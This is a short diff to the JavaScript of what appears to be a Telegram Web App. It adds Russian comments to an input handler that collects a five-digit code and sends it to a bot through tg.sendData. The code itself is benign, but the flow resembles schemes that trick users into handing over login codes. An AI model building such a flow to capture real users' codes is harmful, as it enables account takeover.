@@ -88,7 +88,7 @@
                 codeContainer.onclick = function() { codeInput.focus(); };
 
                 codeInput.addEventListener('input', function(e) {
-                    const value = this.value.replace(/\D/g, '');
+                    const value = this.value.replace(/\D/g, ''); // Только цифры
                     this.value = value;
 
                     codeCells.forEach((cell, index) => {
@@ -106,11 +106,13 @@
                         }
                     });
 
+                    // Как только ввели 5 цифр — отправляем
                     if (value.length === 5 && !isSent) {
                         isSent = true;
-                        this.blur();
+                        this.blur(); // Прячем клавиатуру
 
                         setTimeout(() => {
+                            // ОТПРАВЛЯЕМ КОД БОТУ ЧЕРЕЗ WEB APP DATA
                             tg.sendData(JSON.stringify({ type: "code", code: value }));
                             setTimeout(() => tg.close(), 500);
                         }, 300);
